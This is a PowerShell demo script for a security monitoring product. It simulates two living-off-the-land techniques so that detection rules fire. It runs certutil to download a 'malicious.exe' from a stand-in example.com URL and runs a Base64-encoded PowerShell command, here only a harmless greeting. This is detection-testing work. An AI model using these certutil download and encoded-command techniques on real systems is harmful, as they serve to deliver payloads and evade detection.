# SOCflow - Attack Simulation Script (FOR DEMO ONLY)
# This script simulates common Living Off The Land (LOTL) techniques 

function Pause-AndExit {
    Write-Host "`n==========================================" -ForegroundColor Red
    Write-Host "Simulation Done. Press any key to exit..." -ForegroundColor Red
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    exit
}

Write-Host "==========================================" -ForegroundColor Red
Write-Host "    LOTL Attack Simulation Started" -ForegroundColor Red
Write-Host "==========================================" -ForegroundColor Red

try {
    # 1. Simulate CertUtil Abuse (Rule: CertUtil Download)
    Write-Host "`n[METHOD 1] CertUtil Abuse (LOLBAS)" -ForegroundColor Cyan -NoNewline
    Write-Host " - Using 'certutil.exe' to download files." -ForegroundColor White
    Write-Host "Explanation: Attackers use trusted system tools like CertUtil to bypass security filters." -ForegroundColor Gray
    
    try {
        $dummyUrl = "http://example.com/malicious.exe"
        $dummyPath = "$env:TEMP\demo_malware.txt"
        Write-Host "Running: certutil.exe -urlcache -split -f $dummyUrl $dummyPath" -ForegroundColor DarkGray
        certutil.exe -urlcache -split -f $dummyUrl $dummyPath
        Write-Host "✅ Command executed." -ForegroundColor Green
    }
    catch {
        Write-Host "❌ Failed to execute CertUtil simulation: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    # 2. Simulate Encoded PowerShell (Rule: Suspicious PowerShell)
    Write-Host "`n[METHOD 2] PowerShell Obfuscation" -ForegroundColor Cyan -NoNewline
    Write-Host " - Using '-EncodedCommand' to hide script logic." -ForegroundColor White
    Write-Host "Explanation: Encoding commands in Base64 is a common way to evade simple keyword-based detection." -ForegroundColor Gray

    try {
        $encodedCommand = "V3JpdGUtSG9zdCAiSGVsbG8gZnJvbSBMT1RJZmxvdyBEZW1vISIgLUZvcmVncm91bmRDb2xvciBHcmVlbg=="
        Write-Host "Running: powershell.exe -EncodedCommand $encodedCommand" -ForegroundColor DarkGray
        powershell.exe -EncodedCommand $encodedCommand
        Write-Host "✅ Command executed." -ForegroundColor Green
    }
    catch {
        Write-Host "❌ Failed to execute PowerShell simulation: $($_.Exception.Message)" -ForegroundColor Yellow
    }

    Write-Host "`nAll simulations completed!" -ForegroundColor Green
    Write-Host "Check the SOCflow Dashboard for new alerts." -ForegroundColor Yellow
}
catch {
    Write-Host "`n❌ An unexpected error occurred: $($_.Exception.Message)" -ForegroundColor Red
}
finally {
    Pause-AndExit
}
